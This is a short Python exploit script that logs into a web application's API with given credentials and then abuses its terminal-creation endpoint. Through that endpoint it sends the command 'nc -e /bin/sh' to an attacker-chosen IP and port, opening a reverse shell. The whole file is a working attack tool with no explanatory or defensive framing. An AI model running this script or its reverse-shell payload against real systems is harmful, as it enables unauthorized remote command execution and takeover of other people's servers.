 #!/usr/bin/python3

import requests
import sys
import warnings
from bs4 import BeautifulSoup
import json

warnings.filterwarnings("ignore", category=UserWarning, module='bs4')

if len(sys.argv) < 6:
    print("Usage: ./exploit.py http(s)://url username password listenerIP listenerPort")
    exit()

url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
ip = sys.argv[4]
port = sys.argv[5]

req = requests.session()
login_creds = {
    "username":username,
    "password":password,
    "mode":"normal"}



print("[+] Sendin login request...")
login = req.post(url+"/api/core/auth", json = login_creds)


if username in login.text:

    page = url + "/api/terminal/create"

    payload = {

            'command':'nc -e /bin/sh ' + ip + ' ' + port ,
            'autoclose':True


          }
    payload = json.dumps(payload)
    print("[+] Sending payload...")

    send_payload = req.post(page, payload)

    print("[+] Check your listener !...")

else:
    print("[-] Wrong credentials or may the system patched.")
    exit()